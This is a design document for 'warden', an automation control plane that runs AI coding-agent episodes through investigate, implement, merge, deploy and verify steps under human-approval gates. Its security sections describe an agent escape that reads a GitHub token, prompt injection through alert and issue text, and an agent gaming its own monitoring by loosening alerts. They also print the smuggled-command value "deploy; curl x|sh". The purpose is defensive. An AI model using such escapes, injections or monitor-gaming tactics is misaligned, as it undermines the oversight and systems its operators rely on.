# warden — design

**warden turns a signal into a verified outcome, and it is the only thing in the
estate that holds that state.** Everything else feeds it (pollers), executes for
it (sideclaw), or renders it (Argo, Slack).

STATUS: design v2. **Wave 0 is built and live** — the loop, the pollers and the
ledger run here on five LaunchAgents, and sideclaw enforces the repo allowlist.
`STATE.md` is where the implementation actually is and is the file to read first;
this one is what it is measured against. v1 was reviewed by three agents and one
out-of-family model; four criticals came back and are folded in here. `REVIEW.md`
records what was rejected and why.

---

## Why this exists

Measured on the live `watchdog.db`, 14 days to 2026-09-09:

| | |
|-|-|
| Distinct signatures entered the loop | 49 |
| `investigate` episodes in the window | 11 (15 all-time, over 38 days) |
| → produced a shipped, merged fix | **1** |
| Items marked `resolved` | 28 |
| → closed because the signal went quiet | 23 |
| → closed on an observed recovery message | 2 |
| Items holding a written fix and no way to say yes | 3 |

The one success is worth stating precisely, because it is the existence proof
that the chain works: dispatch id15 diagnosed a HyperDX threshold bug, id16
implemented it, PR `jkrumm/vps#8` merged 2026-09-08, and the two alerts it
touched then resolved through `resolve_recovery_paired()` — a positive-signal
path, not a timeout. One in eleven. The other ten verdicts were correct and went
nowhere.

Three items are still sitting in `needs_human`, each with concrete repro and fix
steps written into its `note`, the oldest since 2026-09-07. **A correct verdict
has nowhere to go.** That is the defect.

A second, structural failure: ingest (`watchdog-poll.py`) and verdict-folding
(`dispatch-sweep.py`) run as cron jobs **inside the Hermes gateway process**,
while the act-loop runs on its own LaunchAgent. The gateway crash-looped on
2026-09-07 — seven restarts in 3m34s, confirmed in `gateway-starts.log` — and
the loop kept ticking against a ledger that had stopped receiving signals. It
had no way to notice it was blind.

A control plane cannot live inside the thing it supervises. That is the argument
for a separate repo, and it is the same argument that already moved the act-loop
out of the gateway's scheduler once.

---

## What "done" means

| Metric | Today | Target |
|-|-|-|
| Verdicts reaching a **recorded** disposition | 1 / 11 | 11 / 11 — `implement`, `dismissed` with a reason, or `needs_human`. Silence is never an outcome. |
| Closes that are verified fixes vs. silence | 0 / 28 | verified is the majority of closes **for mapped signatures** |
| Median `needs_human` → human decision | no answer path exists | < 4h |
| Verified unattended fixes per week | 0 | ≥ 2, sustained over a month |
| Minutes with no poller running | unmeasured | 0, and alarmed |
| **Reverts and reopen-after-`fixed`** | unmeasured | tracked per category; either one demotes a tier |

The last row is not decoration. Without it the fourth row is trivially gameable —
see *Self-concealing change* below.

**Row 2 was `2 / 28` in v2 and is corrected to `0 / 28` here (2026-09-09, Wave 2),
because v2 contradicted itself.** The 2 were items 931/932, closed by
`resolve_recovery_paired()` on an observed ✅ — the same two counted in § *Why this
exists*, and the same two `REVIEW.md` § *Facts corrected* names. But § *What must
not be lost* item 4 says of that path, in as many words, that it **never claims a
fix**: a service that is fully down also stops emitting, and a recovery message
cannot tell "we fixed it" from "it came back on its own" any better than silence
can. Counting an alert clearing as a verified fix is precisely the Goodhart
failure `REVIEW.md` **C3** exists to prevent, so item 4 wins and the row moves.

Concretely: `fixed` requires a **positive liveness probe**
(`maybe_check_liveness()`, the one producer), recovery-pairing and the quiet timer
both produce `quiet`, and **zero rows have ever carried a liveness confirmation**.
So this number reads 0 today and **cannot move until at least one repo has a
deploy target and a liveness probe and the whole chain completes** — Wave 3+. That
is a real constraint on the headline metric and it is stated here rather than
discovered from a dashboard reading zero.

---

## Non-goals

- **Not an LLM coordinator.** No supervisor agent, no agent-to-agent messaging.
  MAST's taxonomy over 200+ traces: 41.8% specification failures, 36.9%
  inter-agent misalignment, 21.3% verification failures. Anthropic's own writeup
  says multi-agent is a poor fit when steps share context or have dependencies,
  and that coding parallelizes worse than research. This pipeline is sequential
  and dependent.
- **Not a workflow engine.** SQLite plus a 10-minute tick.
- **Not a chat interface.** Slack and Argo are surfaces, never state.
- **Not a general planner.** See *Known limit: the planning problem*.

---

## Principles

1. **One ledger.** `warden.db` is the source of truth. Slack cards and Argo pages
   are projections. A button click is not the event — it writes to the ledger and
   the ledger re-renders the surface.
2. **Deterministic control plane; LLMs only inside bounded steps.** No LLM call
   decides a state transition.
3. **Every surface is optional; the ledger and the loop are not.**
4. **A policy file may name and parameterise, never express.** Config carries
   validated values; code owns the argv array. v1 broke this by interpolating
   config into a shell string — see *Deploy*, which is where the line actually is.
5. **Observation status and remediation obligation are different facts.** A
   signal going quiet may cancel the need to *start* work. It may never discharge
   a verdict, a pending approval, or an in-flight operation.
6. **Every non-terminal state names the thing that polls it and its deadline.**
   Checked against the diagram, not assumed.
7. **Nothing is silently discarded to stay under a bound.** Overflow waits.
8. **Ask a human only where a human is essential** — four cases, below.

---

## Security model: the episode is not contained

This is stated first because v1 assumed the opposite and every gate downstream
depends on it.

sideclaw's `readOnly` tier is three tool names on a CLI flag —
`--disallowedTools Write,Edit,NotebookEdit` — under
`--dangerously-skip-permissions`. **Bash is unrestricted.** sideclaw's own source
comments name two confirmed escapes, one of which is
`secrets-run read op://mini/github/token`, promptless on this host, with the
recipe in the CLAUDE.md that tier deliberately loads. Its conclusion: *"the
honest fix is an OS-level sandbox."*

Three consequences, all binding:

- **A bearer token on the mini is not an authorization boundary against an
  episode.** Anything an episode can `curl`, it can reach.
- **The brief is attacker-influenceable.** Public GitHub issues, alert text and
  log lines all reach it.
- **`POST /api/jobs` on sideclaw has no auth and no repo allowlist.** `cwd` is
  any absolute path containing `.git`. The entire repo-scope control today is
  `resolve_repo()` inside `hermes-cc.sh` — which this design moves to warden.

**Therefore the repo allowlist and tier ceiling must be re-asserted inside
sideclaw, in Wave 0.** Warden's copy is defence in depth; sideclaw's is the
boundary. Moving the only check out of the executor and calling that a
separation of concerns is how the tiers table becomes advisory.

**Two limits of that pin, measured 2026-09-09 once it was built, because the
sentence above reads as if it were absolute and it is not.** The policy keys on
the **directory basename**, not on git identity: a clone or worktree of `warden`
sitting under any other name, directly under a dispatch root, resolves to the
default tier and defeats its own pinned entry. And **`~/IuRoot` is a dispatch
root with no rules at all** — every work repo under it is reachable at
`implement`. Neither was introduced by the boundary work; both are what a
basename-keyed allowlist over two roots means. Naming them here so the next
reader does not have to rediscover that "pinned" is narrower than it sounds.

**Warden's tier ceiling on `sideclaw` and `warden` is no longer pinned below
`implement`** (owner decision, 2026-09-15) — both are `implement`-reachable
like any other repo in `config/dispatch-repos.json`. sideclaw is a valid
dispatch target today.

**The merge into the automation itself is gated (2026-09-23).** The
implement tier is unchanged, but the LAND step is not self-authorized for
the three repos that ARE the automation: `config/dispatch-repos.json` now
carries `merge_approval: ["sideclaw", "warden", "dotfiles"]`. An implement
episode may still run against them and open a draft PR, but a clean step-7
validation routes the item to `needs_human` — carrying the repo, the PR URL
and the `warden merge` call — instead of calling `plan_or_land()`. The owner
lands it with `warden merge <job> --why --confirm`, which re-checks the merge
gate against the already-`confirmed` `validation_status` rather than
re-running the review.

---

## The model

| Noun | What | Owner |
|-|-|-|
| **Signal** | One deduplicated observation. Append-only. | pollers |
| **Item** | One unit of work with a lifecycle and an obligation. | the loop |
| **Episode** | One bounded sideclaw run. Disposable — the verdict is copied into the ledger the moment a terminal status is read. | sideclaw |
| **Intent** | An unsigned request for a human decision. | any surface |
| **Decision** | One signed human answer, bound to bytes. Single-use. | the signer |

Origins: `alert`, `human` and `github_issue` are real as of Wave 6.1 — every
`triage_items` row carries `origin` and a `max_tier` ceiling
(`implement`/`investigate`); see `docs/triage.md`'s own *Origins* section for
the mechanics. `github_pr`, `agent` later.

### Lifecycle

Redrawn from the implemented machine, not from scratch. `pr_open`, `snoozed` and
the dissolve edge are real and were missing from v1.

```
new -> investigating -> verdict -+-> implementing -> validating -+-> merged -> deploying -> verifying -> fixed
                                 |                               +-> merge_blocked
                                 +-> needs_human                 
                                 +-> dismissed (reason required)
                                 +-> pr_open
                                 +-> split         (UNRELATED SIGNATURES, cluster dissolve)
split -> investigating   (individual re-evaluation, singleton)
split -> needs_human     (deadline, verdict carried in `note`)
new -> ignored | note | snoozed -> new
merge_blocked | needs_human -> implementing   (revision: a blocking review finding or
                                          failed checks, ≤ revisionMaxAttempts — §92)
terminal: fixed | quiet | closed | dismissed | ignored | note
```

Two changes from today, both about honesty:

- **`resolved` splits.** `fixed` = a change landed and a positive signal
  confirmed it. `quiet` = the signal stopped and nothing shipped. `closed` = a
  human said done.
- **`dismissed` is a real terminal state** with a required reason. Cheap to
  build: sideclaw's verdict enum already has `nextAction: "none"` and nothing
  consumes it.

### The quiet rule, corrected

v1 said "every non-terminal state also goes to `quiet` when its underlying signal
resolves." **That reproduces the exact bug warden exists to fix.** Execute it: an
intermittent fault alerts, an investigation writes a correct fix, the item
reaches `needs_human`, the fault clears on its own, the item goes terminal
`quiet`, the written fix is abandoned. Renaming the state changed nothing.

Worse in the chain: it lets `implementing`, `deploying` and `verifying` go
terminal while an external operation is still running — the ledger declaring
work finished while the actuator is still changing production.

And it is already live: `_GROUPED_RESOLVE_EXCLUDED_STATES` excludes only
`resolved/ignored/snoozed/note/investigating`, so a grouped-source item in
`needs_human` **quiet-resolves after 2h** — 90 minutes before this document's own
4h SLA for answering one. The metric would read better the more human decisions
got dropped.

**Rule:** silence-resolve applies only to `new`. Every other state carries an
obligation and exits only through its own transition or its deadline.

**And not to a chronic `new`** (2026-09-28, state-log §91): a mapped signature
that reopened ≥3 times in 7 days is held out of silence-resolve, because each
occurrence clearing on its own is exactly why no single one got investigated —
the recurrence is the obligation.

### Deadlines

Every non-terminal state gets a `state_deadline` and a named poller. Today only
`liveness_pending` has one; `poll_implement_jobs` and `poll_validation_jobs` have
no deadline and no attempt counter, and sideclaw prunes terminal jobs at 24h *or*
200 rows — a cap shared with every interactive `/check`. An item whose job was
pruned is stuck forever with nothing polling it out.

| State | Poller | Deadline | On expiry |
|-|-|-|-|
| `investigating` | dispatch poll | 2h | `needs_human`, note the timeout |
| `implementing` | implement poll | 2h | `merge_blocked` |
| `validating` | validation poll | 1h | `merge_blocked` |
| `merge_blocked` | operator | 7d | `dismissed`, reason `unresolved` |
| `merged` (no deploy) | — | 1h | `closed` |
| `deploying` | reconciler | 30m | `unknown` → reconcile |
| `verifying` | liveness | 2h | `new`, reopened with history |
| `needs_human` | operator | 7d, reminder at 1d | `dismissed`, reason `expired` |
| `pr_open` | PR poll | 14d | `dismissed` |
| `split` | escalate | 24h | `needs_human`, verdict carried in `note` |

---

## When a human is essential

Four cases. Everything else runs unattended.

1. **Irreversible and unscoped** — outside a declared path scope, or with no
   tested compensation.
2. **Only a human can supply it** — biometric `op`, a tailnet ACL push, a
   console-only action, a judgement about intent rather than fact.
3. **Genuinely ambiguous with expensive branches** — two plausible root causes
   with materially different fixes.
4. **The change alters the system's ability to observe itself** — monitoring
   config, alert thresholds, log levels, the health check, warden's own policy
   files. **This case is never promotable to automatic.**
   *Narrowed 2026-09-28 (owner decision, REVIEW.md C3 disposition update,
   state-log §93):* monitor config in a repo that is not the loop's own
   (Kuma `monitors.yaml`, HyperDX alert JSON, a service's watchdog) runs
   unattended behind a real step-7 review gate that blocks unevidenced
   loosening, with its own monitor UP as the only `fixed`. Warden's own policy
   files and the `merge_approval` repos (`warden`, `sideclaw`, `dotfiles`)
   remain this case, unchanged.

### The host-verb carve-out — why a restart is not case 2

The owner's decision, 2026-09-11 (STATE.md, docs/history/state-log.md §59): "if warden is
confident in a fix it must do it, even a host-level action like restarting a
process. `needs_human` for a restart is friction." FLOWS.md flow 5 used to read
a wedged-gateway restart as case 2 — "only a human can supply it" — and that
was the wrong reading of case 2's OWN reason. Case 2 is about **presence**: a
biometric `op` prompt, a tailnet ACL push, a console-only action literally
need a human's body at a keyboard, because nothing else can supply the
credential or the click. `launchctl kickstart -k gui/<uid>/ai.hermes.gateway`
needs none of that — it is a plain, already-scriptable command the very
LaunchAgent running warden's own loop could always have issued.

So: a restart run through a **fifth closed allowlist**
(`HOST_VERB_ALLOWLIST`, scripts/triage.py — same shape as the deploy
allowlist, VERB_ALLOWLIST, EVIDENCE_ALLOWLIST and LIVENESS_ALLOWLIST; a policy
rule may SELECT a key, never express an argv), gated to run only against an
**idempotent** verb (a restart is safe to issue twice), and followed by a
**liveness-verified** confirmation (maybe_check_liveness()'s own
LIVENESS_ALLOWLIST probe — a positive push, never silence) before the item
is ever marked done, is not case 2 — it is the SAME shape the existing
merge → deploy → verify chain already runs unattended for a code change, one
step shorter. **Corrected 2026-09-11**: it does NOT require `confidence: high`
on the folded investigate verdict — `hostVerbMinConfidence` defaults to
`medium`, deliberately below auto-implement's own `high` floor, because a
restart from this allowlist is idempotent, confirmed by a positive liveness
probe before the item is ever marked done, and capped at
`hostVerbMaxAttempts`: a wrong guess costs one restart and a `needs_human`
card carrying the receipt, which is cheaper than a human running that exact
same restart by hand — a multi-file code change has no such cheap, verified
undo, which is why `high` stays the right bar there and not here. A failed or
unconfirmed restart still falls back to `needs_human` — case 2 stands
whenever the closed allowlist itself cannot resolve the situation. What makes
a case-2 action
promotable here and not elsewhere is specific to a **host restart**: cases 1
and 4 above are not being reopened by this carve-out, and neither is "only a
human can supply it" for anything that genuinely needs a human's own
credential or presence.

### Self-concealing change — why case 4 exists

The seeded auto-merge scope is `vps/observability/**` and the seeded liveness
probe re-reads the merged threshold from HyperDX. That verifies *the deploy
applied*. It does not verify the alert can still fire.

An alert fires. Warden diagnoses "threshold too tight," raises it, validates,
merges, deploys. The probe confirms the new threshold is live. Item → `fixed`.
**The alert now never fires, and `/metrics` scores this as a verified unattended
fix — the number this design optimizes for.** The operator finds out when the
thing being watched for happens, unwatched.

Mitigations, all required together:

- Case 4 above: monitoring config never goes above tier 2.
- `fixed` for monitoring config requires a **synthetic trip** proving the alert
  still fires, not that the config landed.
- A deploy target's own definition — `Makefile`, `scripts/**`, `.github/**` — is
  permanently outside every `autoMergePaths`. Otherwise warden can write the code
  it then executes.
  *Executable since 2026-09-28:* `NEVER_AUTO_MERGE` in `scripts/lifecycle/merge.py`,
  checked on every unattended merge whatever the scope says (state-log §99).

### Promotion and demotion

v1 said "an approval you grant every time is a bug, promote it." That is wrong on
its own: approve-rate measures the sample, not the policy, and approval fatigue
causes a 100% approve rate as often as good scoping does.

- **Promotion requires two independent signals**: a high approve-rate **and** a
  clean outcome record — verified `fixed`, zero reverts, zero reopen-after-`fixed`
  — over the same window. It is a manual policy edit, never automatic.
- **Demotion is automatic**: one revert or one reopen-after-`fixed` drops the
  category a tier.

---

## Boundaries

| System | Responsibility | Holds state? | Failure domain |
|-|-|-|-|
| **warden** | ingest, dedupe, decide, drive the lifecycle, ask a human | **yes — the ledger** | mini, own LaunchAgents |
| **sideclaw** | execute one bounded episode; **enforce the repo allowlist and tier ceiling** | job store, disposable | mini, own daemon |
| **signer** | mint a signed decision; reachable **only by Slack Socket Mode** (the TTY-gated CLI is withdrawn — § The decision primitive) | signing key, RAM-only | gateway process |
| **hermes** | conversational agent; Slack surface; also a signal source | its own, unrelated | mini, gateway |
| **Argo** | operator console; records intents | display cache only | **VPS — separate domain** |

warden never runs inside sideclaw (the loop judges whether the actuator worked)
and never inside hermes (already learned once).

**One contract to sideclaw, not four.** `hermes-cc.sh` is four things and only two
belong here: the budgets, `resolve_repo`, `resolve_tier`, `require_auto_from_item`,
`merge_gate_check` and `run_deploy_if_enabled` are warden; the sideclaw client is
a thin replaceable shim; ~700 lines of GitHub API is its own module; the token
handling is shared infra. Warden depends on exactly
`submit(tier, repo, brief, model) -> jobId` and `get(jobId) -> {status, result}`.
`record_as_job_json` and hermes-cc's invented `queued`/`lost` statuses are deleted,
not moved.

**The verdict schema is published by sideclaw as a versioned artifact.** It
physically lives there (`dispatch.ts`, zod `strictObject` per tier); copying it
into warden guarantees drift, and drift presents as "verdict silently ignored" —
the exact failure this exists to fix. A version mismatch is a loud refusal, not a
best-effort parse.

**Verdicts must become typed before warden can classify them.** Seven distinct
handler outcomes are currently string-concatenated into one prose `verdict` field,
and a sensitive-withheld verdict is typeless entirely — detectable only by
substring-matching `"Verdict withheld: matched "`, and indistinguishable from a
genuine needs-human. A typed `outcome` enum in sideclaw is a small PR and it
unblocks the headline metric.

---

## Contracts

### The decision primitive — intent and signature are separate

v1 proposed `POST /items/:id/decide` behind a bearer token. **That destroys the
only property that makes the gate real.** Today the signing key exists solely in
the gateway's RAM, is minted at startup, is never serialized, and the only thing
that can cause a signature to exist is a Slack interaction payload. The plugin
states it in one sentence: prompt injection reaching a brief *"produces words, and
words cannot mint a signature."* **A bearer token is words** — and per the
security model, an episode can hold one.

Second defect: `payload_hash` binds an approval to specific *bytes*.
`decide(item_id, …)` binds to mutable state, so the brief can change between
decision and spend. A strict downgrade.

Split it:

```
POST /items/:id/intent   -> records an unsigned request. Any surface. Not authority.
sign(intent) -> Decision -> Slack Socket Mode only.
                            Binds payload_hash over the exact brief bytes.
```

Argo shows the queue and records intents. It cannot approve. Keep
`require_signed_approval()` exactly as it is: it trusts only the row's signature
and never the caller, which is why it survives this change untouched.

**The TTY-gated CLI was specified here and is withdrawn (2026-09-09, Wave 1).**
It was unimplementable as written, and the reason is worth keeping because it
constrains every future "let a human decide from somewhere else" idea:

- The signing key is RAM-only in the gateway (see § Systems). A separate CLI
  process cannot reach it, so with the gateway *stopped* — the only scenario the
  TTY path existed for, FLOWS.md flow 5 — **no signature can exist at all.**
- Having the CLI ask the running gateway to sign reintroduces the signing oracle
  REVIEW.md **C1** rejected.
- A second key needs a human-only secret on the mini, and **this estate cannot
  hold one.** `dotfiles-private/headless.refs` is explicit: the seed refuses
  `op://Private/*` unconditionally, and everything in the mini's offline cache
  resolves headless — so anything an operator could store, an episode can read.
  A passphrase kept only in a human's head would work cryptographically and fail
  operationally: used perhaps twice a year, with no recovery path once the pubkey
  is published.

**What flow 5 actually does instead:** restart the gateway
(`launchctl kickstart -k gui/$UID/ai.hermes.gateway` — measured at ~8s on
2026-09-09, and the plugin republishes its public key on boot), then approve in
Slack. FLOWS.md already concedes the human is at a machine in that flow; if they
are at a machine, they can restart a LaunchAgent. If the gateway cannot be
restarted at all, approvals are unavailable and **warden fails closed** — nothing
merges without one. That is the correct degradation, and it needs no second
signer to achieve.

`--auto-from-item` stays as-is, including its own honest header: it is *"a
precondition the caller cannot fabricate cheaply,"* not a cryptographic proof —
*"the threat it closes is the loop being WRONG, not the loop being HOSTILE."*
That distinction is exactly what a bearer-authenticated `/decide` erased.

### 2026-09-15 override — Argo IS the owner over the tailnet

The paragraph above this one ("Argo shows the queue and records intents. It
cannot approve.") was correct in 2026-09-09 and is now overridden by an owner
decision recorded the same day as `docs/waves/PLAN.md` Wave 2
(`docs/history/state-log.md` §71) — kept here, not deleted, because the
reasoning it was answering (REVIEW.md **C1**) still has to be checked against
whatever replaces it.

C1's actual claim was never "Argo must not act" — it was "a bearer token is
words, and an episode can hold one, so words must never be able to mint a
signature." That threat model is about **who could produce the request**, not
about which surface renders a button. Slack's signed-approval path answers it
by requiring a Slack interaction payload, because that is the one channel an
attacker-influenced episode cannot forge. Argo answers the identical question a
different way: it is reachable **only** over the owner's own Tailscale network
— `dotfiles-private/headless.refs` and the tailnet ACLs are the boundary, not a
password prompt in the UI — so an action arriving through it is, by
construction, a click from him and not from anything an injected brief could
reach. No label, no passkey, no Touch ID, no Slack-only signing gate is added
for his own actions on his own surfaces; requiring one would treat his tailnet
identity as less trustworthy than a Slack button, which is backwards.

Mechanically: `scripts/triage.py`'s `apply_argo_actions()` pulls pending
actions from Argo's queue and applies `implement`/`merge`/`dismiss`/
`reinvestigate`/`note` through the closed verb allowlist, passing
`authorized_by="owner:argo"` into `lifecycle/dispatch.open_episode()` and
`lifecycle/merge.plan_or_land()` — the exact same plain, unvalidated
truthy-string gate a signed Slack approval's `authorized_by=f"signed:{who}"`
already satisfies (see `lifecycle/dispatch.py`'s `open_episode()`: `if not
authorized_by: raise ValueError(...)` — there has never been a prefix
allowlist, only a non-empty-string requirement). **No signing key touches
Argo, no new `POST /decide`, no bearer-token gate is reopened** —
`require_signed_approval()`/`execute_approved()` are byte-for-byte unchanged
and remain the only path for anything reachable off the tailnet (a Slack
button clicked by anyone with channel access, which is why THAT path still
needs a real signature). This is narrower than it looks: it authorizes actions
taken from a surface only the owner can reach, nothing else.

### HTTP API (mini, tailnet-only, **read-only**)

| Method | Path | Purpose |
|-|-|-|
| `GET` | `/board` `/items/:id` `/health` `/metrics` | projections; opened `file:…?mode=ro` |
| `POST` | `/items/:id/intent` | records an intent; never signs, never executes |
| `POST` | `/items/:id/note` | free-text steering, appended to the next brief |

**Steering is not approving.** Approving answers a yes/no warden asked; steering
is *"don't fix the threshold, fix the probe"* — an additional constraint on the
next episode's brief. Warden has no primitive for it today. A note carries no
authority, so it needs no signature — which is exactly why it must never be able
to advance a state.

Argo caches `GET` responses in Postgres purely so the page renders when the mini
is unreachable, stamped with fetch time. An HTTP cache, not a mirror.

### Deploy — the closed allowlist stays

v1 proposed a machine-writable `deploy-targets.json` interpolated into
`ssh <host> "cd <dir> && make <target> <env>"` and claimed `rm -rf` was
inexpressible. **That string is a shell.** `"deploy; curl x|sh"` is a second
command; `env` was unquoted. It broke principle 4 on the same page that states it.

The reviewer's fix was to keep the closed `case`. **Overridden**, with a reason:
the defect was the *shell string*, not the data. Killing the string keeps the
property and removes the friction.

```
validate  host   in a known-hosts set        dir     ^[A-Za-z0-9._/~-]+$
          target ^[A-Za-z0-9_-]+$            env     ^[A-Z_]+=[A-Za-z0-9_.-]+$
build     an argv array, never an f-string
test      a field containing ; $ ` ' " or whitespace is REJECTED, asserted
```

`ssh` joins its remote command into a string no matter what, so validation — not
quoting — is what makes this safe. With every field constrained to a charset that
cannot express a metacharacter, the concatenation is safe by construction, and
adding a repo is one line of config with no code diff.

`VERB_ALLOWLIST`, `EVIDENCE_ALLOWLIST`, `LIVENESS_ALLOWLIST` and
`HOST_VERB_ALLOWLIST` (the fifth, added 2026-09-11 — see § The host-verb
carve-out) keep the closed `case` shape unchanged — they name behaviours, not
arguments, so there is nothing to validate and no friction to remove.

Even with perfect quoting, a Make target executes repo code, so *who may modify
the target* matters more than *who may name it* — hence the `Makefile`/`scripts/**`
exclusion above.

**Seeded 2026-09-28 (§93):** `uk-sync` (homelab, `ssh homelab` + `op run` on the
server, `monitors.yaml` only), `weatherorb-pull` (`git pull --ff-only` of the
live checkout the periodic LaunchAgents exec), and a third shape beside
`autoDeploy`/`deployOnMerge` — `deployByPoller` for research-gateway, whose
CI-gated mini poller makes merge the deploy; its liveness key
`mini-checkout-live` confirms the poller's checkout carries the merge commit
and `/health` answers ok. Kuma-monitored repos confirm with `kuma-push-fresh`
against the item's own monitor.

Prefer not needing this at all: `weatherorb`, `research-gateway` and `argo` deploy via
GitHub Actions → RollHook, so merge *is* deploy. **`image-share` does not** — it
has no CI and self-documents "CI-less for now," so it belongs with
`vps/observability/`, `homelab` and `homelab-private` in the group that needs a
deploy key.

**As of item 1b (docs/history/state-log.md §47/§48), "merge is deploy" has a mechanism, not just
a claim.** Reconnaissance (§47) found no code path into it at all — a merge in a
repo with no `deploy` key landed in `merged` and expired to `closed` after 1h,
never `liveness_pending`, never a probe, never `fixed`. A `deployOnMerge: true`
policy entry now makes a confirmed merge in that repo enter `liveness_pending`
directly, on the merge commit sha, the same as the ssh-deploy path's
`deploy.attempted && deploy.ok` branch — just reached a different way, since
there is no ssh call whose `attempted`/`ok` this repo's CI/CD could ever set.

The receipt is the part the ssh path structurally cannot provide. `ssh <host>
make <target>` returns only an exit code to the (now dead) process that ran it —
nothing queryable survives a crash mid-deploy. A GitHub Actions run has an id and
is queryable after the fact, by anyone, at any later time, so `gh run list
--commit <sha>` is folded into the merge operation's own `receipt_json` (never
fabricated when the run has not appeared yet or `gh` cannot be read — recorded as
`"unknown"`, the same honesty discipline `reconcile_operations()` already uses
for the ssh half). `argo` is seeded first, with a real liveness gatherer
(`argo-commit-live`, comparing `GET /api/health`'s `commit` field against the
merge sha exactly — reachability alone is never proof) and **deliberately no
`autoMergePaths`**, so the merge gate stays closed and nothing actually merges
into it yet; this slice only builds the mechanism.

### Budgets — absent from v1 entirely

Autonomy without a rate limit is the blast-radius answer. Existing ceilings must
survive the move and be stated: `MAX_OPEN_INVESTIGATIONS=3`,
`DAILY_INVESTIGATE_BUDGET=8` (deliberately under hermes-cc's own 20, so a triage
storm cannot starve interactive dispatch), `MAX_CLUSTER_SIGNATURES=5`,
`MAX_IMPLEMENT_PER_DAY=5`, `MAX_MERGES_PER_DAY=3`. At tier 3 with no daily merge
cap, forty correlated alerts are forty merges and forty deploys.

Add: **a per-repo in-flight lock.** Two implement episodes on one repo today cut
two branches from the same base and open two unaware draft PRs — reachable now,
more so as origins multiply.

**Deferral must be visible.** Today a budget hit writes
`triage: at MAX_OPEN_INVESTIGATIONS=3, deferring cluster in research-gateway` to a
`.err` file nobody reads. An invisible budget is indistinguishable from a broken
loop, and it is the one way budgets become real friction. `deferred` is a
first-class board state carrying which ceiling held it and what releases it.

**`warden pause`** — one command or one button, stops all escalation while leaving
ingest running. During a real outage the ledger should keep recording and the
robot should hold still.

**Disposition, 2026-09-15 (`docs/waves/PLAN.md` Wave 2, `docs/history/state-log.md`
§71): every DAILY COUNT ceiling named above is gone.** `DAILY_INVESTIGATE_BUDGET`,
and the `WARDEN_DAILY_BUDGET`/`WARDEN_IMPLEMENT_BUDGET`/`WARDEN_MERGE_BUDGET` the
implementation grew beyond this v1 sketch's own `MAX_IMPLEMENT_PER_DAY`/
`MAX_MERGES_PER_DAY` names, are deleted — code, checks, CLI/Argo-snapshot output,
tests — on the owner's explicit call ("absurd friction"). This is narrower than
it reads: `MAX_OPEN_INVESTIGATIONS` (concurrency, not spend) and the per-repo
in-flight lock two paragraphs below both stay exactly as designed — a count-based
CEILING is gone, a CONCURRENCY bound and a CORRECTNESS lock are not the same
thing and neither was in question. The "forty correlated alerts are forty merges"
scenario this section warns about is now bounded only by
`MAX_OPEN_INVESTIGATIONS`/the per-repo lock and by `merge_precheck_repo()`'s
existing PR-required-repo refusal — there is no longer a numeric daily
backstop underneath those. "Deferral must be visible" stays true for the
concurrency cap (the `.err` line `MAX_OPEN_INVESTIGATIONS` deferrals write is
untouched); it no longer applies to a budget, because there is none.

### Abort and revert — neither exists today

`cancel` does not cancel: sideclaw exposes submit/list/get only, so it marks the
local row `abandoned` while the episode keeps running. The honest answer to "how
do I stop it" is currently `make herdr-restart`.

- `POST /api/jobs/:id/cancel` in sideclaw, and `warden abort <item>` as a
  lifecycle transition.
- `warden revert <item>` as a first-class transition that records the revert PR
  on the item.
- An item whose episode was interrupted mid-push needs a ledger field for *"there
  is an orphan branch or PR from this item"* — sideclaw deliberately never
  recovers `dispatch` on restart, and salvage bundles are referenced only inside
  an error string.

### Crash recovery — the ledger cannot be atomic with the world

SQLite can atomically change a row. It cannot atomically change a row *and* merge
a PR, start a job, or deploy a service. Crash after a successful deploy and before
recording it: warden either repeats a destructive operation, or refuses because
the approval is spent — which is "approved fix, no action completed" again.

v1's claim that "restarting warden mid-chain loses nothing" was unsupported.
Schema 5 (`operations`, triage.py's `record_operation()`/`complete_operation()`/
`reconcile_operations()`) closes this for the mutating chain — `implement` and
`merge`, the only two verbs that change anything outside sideclaw's own
worktree. `investigate`/validation episodes are deliberately excluded: they are
read-only, in their own worktree, and `dispatch-sweep.py`'s existing
`poll_misses`/`lost` path already covers a forgotten one.

- An **operation id** is recorded (and durably committed) BEFORE the external
  call — `hermes-cc.sh dispatch --tier implement`, or `merge --confirm` — that
  it covers. docs/history/state-log.md §46 Correction 1 is why this lives in its own table
  rather than on `dispatch_approvals`: the unattended door (`--auto-from-item`)
  structurally never produces an approval row, so attribution has to hang off
  something both doors write.
- **Remote receipts** where available: a successful merge persists
  `pullRequest`, `mergeCommit` and the whole `deploy` result — `mergeCommit`
  is hermes-cc.sh's own `merge_sha`, computed for years and thrown away until
  now. The one honest gap: `merge --confirm` covers GraphQL ready-for-review,
  `PUT /pulls/:pr/merge`, a branch delete AND `ssh <host> make <target>`
  behind ONE subprocess boundary, so there is no write-point between the
  merge and the deploy — a reconciled merge's receipt records
  `"deploy": "unknown"` rather than guessing whether the deploy half also ran.
  Splitting that into two operations needs a change in `hermes-agent`, not
  this repo, and is not done here.
- **`unknown` is an explicit outcome**, reconciled before any retry — never
  silently read as failure. Two sources produce it: a genuine process crash
  (an `operations` row left with `outcome IS NULL`), and a call site that
  deliberately declines to guess on an ambiguous return (a subprocess
  timeout, unparseable stdout — both reachable AFTER the external system has
  already accepted the call). `reconcile_operations()` runs FIRST in every
  pass, before anything that could retry, and asks the external system
  directly (sideclaw's `status`, `gh pr view`) rather than trust local state.
  An operation that still cannot be resolved moves its item to
  `needs_human` — "we do not know whether the world changed" is exactly the
  case this system routes to a person, never a machine's second guess.

---

## The ledger

Today `db_connect()` is a bare `sqlite3.connect()` — no WAL, no `busy_timeout` —
with six writers already (the loop, two pollers, `hermes-cc.sh`'s embedded python
several times per invocation, the Slack approval handler, CLI verbs), and **two
processes independently `ALTER TABLE` the same tables with no version table**.
Adding an HTTP server that a VPS dashboard polls means `SQLITE_BUSY` on the loop's
write path, caused by a dashboard read.

- `journal_mode=WAL`, `busy_timeout=5000`.
- **One writer process.** The API opens read-only; intents go through the loop's
  queue.
- **One migrator** plus a `schema_version` table; migrations run only by the loop
  at boot; the API refuses to start on mismatch.
- **Backup.** `VACUUM INTO` on every heartbeat, rotated, shipped to homelab's
  existing restic → B2 path (see *Observability*). There is no restore path today,
  on a machine with FileVault off, auto-login on and unattended reboots.
- After extraction, the Slack approval plugin must stop writing this file
  directly, or the "control plane inside the thing it supervises" coupling
  silently returns.

---

## Observability

- **Heartbeat** — one unconditional row per completed pass with the state census.
  Shipped. This is the fix for the failure that hid for eleven days.
- **Per-poller age** — the gateway-crash mode becomes an alarm instead of silence.
- **Funnel metrics** — the six numbers above, at `/metrics`, rendered in Argo.
